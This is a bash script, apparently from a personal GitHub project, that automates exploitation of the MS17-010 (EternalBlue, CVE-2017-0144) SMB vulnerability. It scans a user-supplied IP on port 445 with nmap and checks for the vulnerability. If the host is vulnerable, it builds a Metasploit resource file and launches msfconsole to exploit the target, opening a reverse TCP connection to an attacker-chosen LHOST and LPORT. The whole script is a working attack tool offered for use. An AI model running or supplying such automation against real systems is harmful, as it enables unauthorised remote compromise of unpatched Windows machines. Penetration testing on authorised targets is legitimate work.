#!/bin/bash
echo ""
cat << 'EOF'
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗  ██╗███████╗       ██████╗  ██╗██╗  ██╗██████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗███║╚════██║      ██╔═████╗███║██║  ██║╚════██╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║╚██║    ██╔╝█████╗██║██╔██║╚██║███████║ █████╔╝
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║ ██║   ██╔╝ ╚════╝████╔╝██║ ██║╚════██║ ╚═══██╗
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝ ██║   ██║        ╚██████╔╝ ██║     ██║██████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝  ╚═╝   ╚═╝         ╚═════╝  ╚═╝     ╚═╝╚═════╝ 
                        https://github.com/vaishnavucv/
EOF
echo ""
echo -e "\e[32m"
read -p "Enter the IP Address to scan: " ip_address
echo ""
read -p "Enter the Scan Name: " scan_name
echo -e "\e[0m"

#echo "the ip address is $ip_address and the scan name is $scan_name.txt" 
# the above line is used for tesing the read functions.

echo "Scanning for the $ip_address, looking for 445.."
echo ""
nmap -p445 -sV  -vv -oN $scan_name-service-enum.txt $ip_address > /dev/null 2>&1

if grep -q "445/tcp" "$scan_name-service-enum.txt"; then
    echo "Port 445 is open"
    echo ""
    service=$(grep "445/tcp" "$scan_name-service-enum.txt" | awk '{print $4 " " $5}')
    echo "Service running on port 445: $service"
    echo ""

    echo "Preforming Vulnerability scan on port 445.."
    nmap -p445 -vv --script smb-vuln-ms17-010 -oN $scan_name-enum-vuln.txt $ip_address  > /dev/null 2>&1
    echo ""

    if grep -q "VULNERABLE:" "$scan_name-enum-vuln.txt"; then 
        echo "MS17-010 vulnerability is detected....."
        echo ""
        echo "Preparing EXPLOIT confing script...!"
        echo ""

        
        read -p "Enter the LHOST for reverse TCP connection: " lhost
        read -p "Enter the LPORT for reverse TCP connection: " lport

        msf6_rc="${scan_name}.rc"
        echo "use exploit/windows/smb/ms17_010_eternalblue" >> $msf6_rc
        echo "show options" >> $msf6_rc
        echo "set rhost $ip_address" >> $msf6_rc
        echo "set lhost $lhost" >> $msf6_rc
        echo "set lport $lport" >> $msf6_rc
        echo "clear" >> $msf6_rc
        echo "show options" >> $msf6_rc
        echo "sleep 5" >> $msf6_rc
        echo "clear" >> $msf6_rc
        echo "exploit" >> $msf6_rc

        echo "Mestasploit Auto-script is created =>=> $msf6_rc"
        echo ""
        echo "Starting msfconsole...."
        echo ""
        msfconsole -q -r $msf6_rc
    else
        echo "MS17-010 vulnerability NOT detected, No Further action..."
        echo ""
        echo "exiting...!"
        exit
    fi
else 
    echo "Port 445 is CLOSED..."
    echo "Skipping Vulnreability scan...!"
fi



